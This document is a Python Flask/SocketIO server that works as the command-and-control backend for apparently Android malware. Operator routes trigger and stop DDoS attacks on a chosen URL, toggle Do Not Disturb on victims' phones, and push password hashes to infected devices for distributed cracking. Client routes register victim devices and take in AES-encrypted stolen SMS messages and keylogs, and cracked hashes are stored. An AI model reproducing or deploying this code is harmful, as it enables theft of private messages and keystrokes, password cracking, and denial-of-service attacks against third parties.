# from flask import Flask, request, jsonify
import eventlet

eventlet.monkey_patch()
# import json
from flask import Flask, request, jsonify
from flask_socketio import SocketIO, emit
import json
import threading
import time
import base64

from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from base64 import b64decode
import os

SECRET_KEY = b"YOUR_SECRET_KEY"  # Ensure this matches the key used in Kotlin
IV_SIZE = 16

eventlet.monkey_patch()
app = Flask(__name__)
socketio = SocketIO(app, logger=True, engineio_logger=True)

# This list will store registered devices, used to be for checking with device is active
# Now it is solely for SMS Registration
devices = []

# Used by sockets
connected_clients = []

# This list will store received SMS data
received_sms = {}  # Maps UUIDs to dictionaries of addresses to lists of message bodies

# Collected hashes from salt bruteforce and non-salt bruteforce
cracked_salted_hashes = []
cracked_hashes = []

# Assuming you already have this global dictionary to map UUIDs to socket IDs
client_map = {}

# Hardcoded password for simplicity
PASSWORD = "YOUR_PASSWORD"

from base64 import b64encode
from cryptography.hazmat.primitives import padding

def aes_encrypt(data_to_encrypt):
    # Convert string to bytes if necessary
    if isinstance(data_to_encrypt, str):
        data_to_encrypt = data_to_encrypt.encode('utf-8')

    # Pad data
    padder = padding.PKCS7(128).padder()
    padded_data = padder.update(data_to_encrypt) + padder.finalize()

    # Generate random IV
    iv = os.urandom(IV_SIZE)

    # Encrypt data
    cipher = Cipher(algorithms.AES(SECRET_KEY), modes.CBC(iv), backend=default_backend())
    encryptor = cipher.encryptor()
    encrypted = encryptor.update(padded_data) + encryptor.finalize()

    # Return IV + encrypted data, base64 encoded
    return b64encode(iv + encrypted).decode('utf-8')

def aes_decrypt(encrypted_data):
    # Decode the base64 encoded data
    decoded_data = b64decode(encrypted_data)
    # Extract the IV from the beginning of the encoded data
    iv = decoded_data[:IV_SIZE]
    encrypted_message = decoded_data[IV_SIZE:]

    # Initialize the cipher
    cipher = Cipher(algorithms.AES(SECRET_KEY), modes.CBC(iv), backend=default_backend())

    # Decrypt the data
    decryptor = cipher.decryptor()
    decrypted_data = decryptor.update(encrypted_message) + decryptor.finalize()

    # PKCS5Padding in Kotlin is equivalent to PKCS7 in cryptography library, handle padding
    padding_length = decrypted_data[-1]
    return decrypted_data[:-padding_length]

###################### THREAT ACTOR ROUTES START ######################

@app.route('/query_power', methods=['POST'])
def queryPower():
    if request.data.decode('utf-8').strip() != PASSWORD:
        return "Unauthorized", 401
    socketio.emit('ps')
    return "Success", 200

@app.route('/dnd_on', methods=['POST'])
def dndOn():
    if request.data.decode('utf-8').strip() != PASSWORD:
        return "Unauthorized", 401
    socketio.emit('dndOn')
    return "Success", 200

@app.route('/dnd_off', methods=['POST'])
def dndOff():
    if request.data.decode('utf-8').strip() != PASSWORD:
        return "Unauthorized", 401
    socketio.emit('dndOff')
    return "Success", 200

@app.route('/dsm', methods=['POST'])
def dsm():
    if request.data.decode('utf-8').strip() != PASSWORD:
        return "Unauthorized", 401
    socketio.emit('dsm')
    return "Success", 200

@app.route('/list_devices', methods=['POST'])
def list_devices():
    if request.data.decode('utf-8').strip() != PASSWORD:
        print(request.data.decode('utf-8'))
        return "Unauthorized", 401
    return jsonify([{'uuid': device['uuid'], 'ip_address': device['ip_address']} for device in devices])

@app.route('/list_ssid_uuid_mappings', methods=['POST'])
def list_ssid_uuid_mappings():
    # Decode the request data and compare it with your password
    if request.data.decode('utf-8').strip() != PASSWORD:
        return jsonify({"error": "Unauthorized"}), 401
    # Generate a list of mappings from the client_map dictionary
    mappings = [{"uuid": uuid, "ssid": ssid} for uuid, ssid in client_map.items()]
    return jsonify(mappings), 200

@app.route('/save_state', methods=['POST'])
def save_state():
    if request.data.decode('utf-8').strip() != PASSWORD:
        return "Unauthorized", 401

    # Save the list of devices.
    try:
        with open('devices.json', 'w') as f:
            json.dump(devices, f)
    except Exception as e:
        print(f"Error saving devices: {e}")

    # Save the dictionary of received SMS messages.
    try:
        with open('received_sms.json', 'w') as f:
            json.dump(received_sms, f)
    except Exception as e:
        print(f"Error saving received SMS: {e}")

    # Save the list of cracked hashes.
    try:
        with open('cracked_hashes.json', 'w') as f:
            json.dump(cracked_hashes, f)
    except Exception as e:
        print(f"Error saving cracked hashes: {e}")

    # Save the list of cracked salted hashes.
    try:
        with open('cracked_salted_hashes.json', 'w') as f:
            json.dump(cracked_salted_hashes, f)
    except Exception as e:
        print(f"Error saving cracked salted hashes: {e}")

    return "State saved successfully", 200

@app.route('/load_state', methods=['POST'])
def load_state():
    if request.data.decode('utf-8').strip() != PASSWORD:
        return "Unauthorized", 401

    # For lists, directly replace the content if duplicates are not a concern.
    # If maintaining unique elements is required, consider implementing a merge strategy that checks for duplicates.
    try:
        with open('devices.json', 'r') as f:
            global devices
            devices = json.load(f)
    except FileNotFoundError:
        print("devices.json not found.")

    # For dictionaries, especially nested ones, a careful merge is necessary.
    try:
        with open('received_sms.json', 'r') as f:
            loaded_sms = json.load(f)
            for uuid, messages in loaded_sms.items():
                if uuid in received_sms:
                    for address, msgs in messages.items():
                        if address in received_sms[uuid]:
                            received_sms[uuid][address].extend(msgs)
                        else:
                            received_sms[uuid][address] = msgs
                else:
                    received_sms[uuid] = messages
    except FileNotFoundError:
        print("received_sms.json not found.")

    # For lists containing unique items.
    try:
        with open('cracked_hashes.json', 'r') as f:
            global cracked_hashes
            cracked_hashes = json.load(f)
    except FileNotFoundError:
        print("cracked_hashes.json not found.")

    try:
        with open('cracked_salted_hashes.json', 'r') as f:
            global cracked_salted_hashes
            cracked_salted_hashes = json.load(f)
    except FileNotFoundError:
        print("cracked_salted_hashes.json not found.")

    return "State loaded successfully", 200

from flask import request, jsonify

@app.route('/send_event_unicast', methods=['POST'])
def send_event_unicast():
    # First, verify the password for security
    data = request.get_json()
    if not data or 'password' not in data or data['password'] != PASSWORD:
        return jsonify({"error": "Unauthorized"}), 401

    # Check for required fields: event and uuid
    if 'event' not in data or 'uuid' not in data:
        return jsonify({"error": "Missing 'event' or 'uuid' parameter"}), 400

    event_name = data['event']
    uuid = data['uuid']

    # Determine the SID based on the client_map
    sid = client_map.get(uuid)
    if not sid:
        return jsonify({"error": "UUID not found"}), 404

    # Emit the event to the specific SID (unicast)
    socketio.emit(event_name, room=sid)
    return jsonify({"message": f"Event '{event_name}' sent to UUID {uuid}"}), 200

@app.route('/list_received_sms', methods=['POST'])
def list_received_sms():
    data = request.get_json()
    if not data or data.get('password') != PASSWORD:
        return "Unauthorized", 401

    uuid = data.get('uuid', None)  # UUID is optional

    if uuid:
        # Retrieve and return messages for the specified UUID
        messages_for_uuid = received_sms.get(uuid, {})
        return jsonify({uuid: messages_for_uuid})
    else:
        # If no UUID is specified, return messages for all UUIDs
        return jsonify(received_sms)

@app.route('/trigger_ddos', methods=['POST'])
def trigger_ddos():
    data = request.get_json(force=True)  # Ensuring that the data is treated as JSON

    # Check for password in the request
    if 'password' not in data or data['password'] != PASSWORD:
        return jsonify({'error': 'Unauthorized'}), 401

    # Check for URL in the request
    if 'url' not in data:
        return jsonify({'error': 'Missing URL'}), 400

    target_url = data['url']
    # Base64 encode the URL
    encoded_url = base64.b64encode(target_url.encode()).decode()

    # Emit the DDoS event to all connected clients with the encoded URL
    socketio.emit('eventFromServerDDOS', encoded_url)  # Sending encoded string directly
    return jsonify({'message': 'DDoS event triggered', 'url': target_url}), 200

@app.route('/stop_ddos', methods=['POST'])
def stop_ddos():
    data = request.get_json(force=True)  # Ensuring that the data is treated as JSON

    # Check for password in the request
    if 'password' not in data or data['password'] != PASSWORD:
        return jsonify({'error': 'Unauthorized'}), 401

    # Emit the stop DDoS event to all connected clients
    socketio.emit('eventFromServerStopDDOS', {'message': 'stop'})
    return jsonify({'message': 'DDoS stop signal sent'}), 200

@app.route('/submit_salt_and_hash', methods=['POST'])
def submit_salt_and_hash():
    data = request.get_json()
    if not data or 'salt' not in data or 'salted_hash' not in data:
        return jsonify({'error': 'Invalid request, missing salt or salted_hash'}), 400

    salt = data['salt']
    salted_hash = data['salted_hash']

    # Prepare the data to be broadcasted
    data_to_broadcast = {'salt': salt, 'salted_hash': salted_hash}
    json_data_to_broadcast = json.dumps(data_to_broadcast)

    # Encrypt the JSON data
    encrypted_data = aes_encrypt(json_data_to_broadcast)

    # Broadcast the encrypted salt and hash to all connected WebSocket clients
    socketio.emit('eventFromServerSaltedCrackHash', encrypted_data)

    return jsonify({'message': 'Salt and hash submitted successfully'}), 200

@app.route('/submit_hash', methods=['POST'])
def submit_hash():
    data = request.get_json()
    print(data)
    if not data or 'hash' not in data:
        return jsonify({'error': 'Invalid request, missing hash'}), 400

    hash_to_crack = data['hash']
    data_to_broadcast = {'hash': hash_to_crack}
    json_data_to_broadcast = json.dumps(data_to_broadcast)
    encrypted_data = aes_encrypt(json_data_to_broadcast)

    # Broadcast the hash to all connected WebSocket clients
    socketio.emit('eventFromServerCrackHash', encrypted_data)
    return jsonify({'message': 'Hash submitted successfully'}), 200

# @app.route('/submit_hash', methods=['POST'])
# def submit_hash():
#     data = request.get_json()
#     if not data or 'hash' not in data:
#         return jsonify({'error': 'Invalid request, missing hash'}), 400

#     hash_to_crack = data['hash']

#     # Broadcast the hash to all connected WebSocket clients
#     socketio.emit('eventFromServerCrackHash', {'hash': hash_to_crack})

#     return jsonify({'message': 'Hash submitted successfully'}), 200

###################### THREAT ACTOR ROUTES END ######################

###################### C2 CLIENT ROUTES START #######################

@app.route('/register_device', methods=['POST'])
def register_device():
    data = request.get_json()
    print(data)
    if not data:
        return jsonify({"error": "No data provided"}), 400

    uuid = data.get('uuid')
    ip_address = request.remote_addr

    if not uuid:
        return jsonify({"error": "UUID is required"}), 400

    for device in devices:
        if device['uuid'] == uuid:
            return jsonify({"status": "registration_exists"}), 200

    device = {'uuid': uuid, 'ip_address': ip_address}
    devices.append(device)
    return jsonify({"status": "registration_success"}), 201

@app.route('/receive_sms', methods=['POST'])
def receive_sms():

    # Assuming encrypted_data is the encrypted base64 string
    aes_decrypted_data = aes_decrypt(request.data)
    base64_decoded_data = base64.b64decode(aes_decrypted_data)
    json_str = base64_decoded_data.decode('utf-8')
    decrypted_data = json.loads(json_str)

    # decrypted_request = aes_decrypt(request.data)
    # print(decrypted_request)
    # decrypted_string = decrypted_request.decode('utf-8')
    # print(decrypted_string)
    # request_json = json.loads(decrypted_string)
    # print(request_json)

    sms_data_list = decrypted_data # Expecting a list of messages
    if not isinstance(sms_data_list, list):
        return "Expected a list of messages", 400
    print(sms_data_list)

    for sms_data in sms_data_list:
        uuid = sms_data.get('uuid')
        address = sms_data.get('address')
        body = sms_data.get('body')
        type = sms_data.get('type', 'unknown')  # Default to 'unknown' if not provided
        date = sms_data.get('date', 'unknown')  # Default to 'unknown' if not provided

        if not all([uuid, address, body]):
            return "UUID, address, and body are required for each message", 400

        if uuid not in received_sms:
            received_sms[uuid] = {}
        if address not in received_sms[uuid]:
            received_sms[uuid][address] = []

        received_sms[uuid][address].append({
            "body": body,
            "type": type,
            "date": date
        })

    return "SMS received successfully", 200

@app.route('/receive_broadcast_sms', methods=['POST'])
def receive_broadcast_sms():
    sms_data = request.get_json()
    print(sms_data)
    if not sms_data or 'uuid' not in sms_data or 'address' not in sms_data or 'body' not in sms_data:
        return jsonify({'error': 'Invalid request, missing uuid, address, or body'}), 400

    uuid = sms_data['uuid']
    address = sms_data['address']
    body = sms_data['body']

    if uuid not in received_sms:
        received_sms[uuid] = {}

    if address not in received_sms[uuid]:
        received_sms[uuid][address] = []

    received_sms[uuid][address].append({"body": body})

    return jsonify({'message': 'Broadcast SMS received successfully'}), 200

@app.route('/receive_keylog', methods=['POST'])
def receive_keylog():
    # Ensure there's data in the request
    if not request.data:
        return jsonify({'error': 'No data provided'}), 400

    # Get the encrypted keylog data
    encrypted_keylog = request.data

    # Decrypt the keylog data
    try:
        decrypted_keylog = aes_decrypt(encrypted_keylog)
        # Convert the decrypted data from bytes to string, assuming UTF-8 encoding
        keylog_str = decrypted_keylog.decode('utf-8')
        print(f"Received keylog: {keylog_str}")
        return jsonify({'message': 'Keylog received successfully'}), 200
    except Exception as e:
        print(f"Error decrypting keylog data: {e}")
        return jsonify({'error': 'Failed to decrypt keylog data'}), 500

###################### C2 CLIENT ROUTES END #######################

@socketio.on('hashCrackSuccess')
def handle_hash_crack_success(encrypted_data):
    try:
        aes_decrypted_data = aes_decrypt(encrypted_data)
        base64_decoded_data = base64.b64decode(aes_decrypted_data)
        json_str = base64_decoded_data.decode('utf-8')
        decrypted_data = json.loads(json_str)

        if 'plaintext' in decrypted_data and 'hash' in decrypted_data:
            # Check if the hash already exists in cracked_hashes
            if not any(cracked_hash['hash'] == decrypted_data['hash'] for cracked_hash in cracked_hashes):
                cracked_hashes.append(decrypted_data)
                print(f"Added new cracked hash: {decrypted_data}")
            else:
                print("Duplicate hash, not added.")

        print(f"Current list of cracked hashes: {cracked_hashes}")
    except Exception as e:
        print(f"Error decrypting or parsing data: {e}")

@socketio.on('saltHashCrackSuccess')
def handle_salt_hash_crack_success(encrypted_data):
    try:
        # Assuming encrypted_data is the encrypted base64 string
        aes_decrypted_data = aes_decrypt(encrypted_data)
        base64_decoded_data = base64.b64decode(aes_decrypted_data)
        json_str = base64_decoded_data.decode('utf-8')
        decrypted_data = json.loads(json_str)

        if 'plaintext' in decrypted_data and 'salt' in decrypted_data and 'hash' in decrypted_data:
            # Check if the hash already exists in cracked_salted_hashes
            if not any(cracked_hash['hash'] == decrypted_data['hash'] for cracked_hash in cracked_salted_hashes):
                cracked_salted_hashes.append(decrypted_data)
                print(f"Added new salted cracked hash: {decrypted_data}")
            else:
                print("Duplicate salted hash, not added.")

            print(f"Current list of cracked salted hashes: {cracked_salted_hashes}")
    except Exception as e:
        print(f"Error decrypting or parsing data: {e}")

@socketio.on('update_sid')
def handle_update_sid(json):
    if 'uuid' in json:
        uuid = json['uuid']
        sid = request.sid
        client_map[uuid] = sid
        print(f'Updated SID for UUID {uuid} to {sid}')
    else:
        print('UUID not provided in update_sid event')

# Define WebSocket events
@socketio.on('connect')
def handle_connect():
    if request.sid not in connected_clients:
        connected_clients.append(request.sid)
        # Emit the hash to the newly connected client
        # emit('eventFromServerCrackHash', hash_to_send)
    print(f'Client connected: {request.sid}')

@socketio.on('disconnect')
def handle_disconnect():
    if request.sid in connected_clients:
        connected_clients.remove(request.sid)
    print(f'Client disconnected: {request.sid}')

if __name__ == '__main__':
    socketio.run(app, host='0.0.0.0', port=8000, debug=True)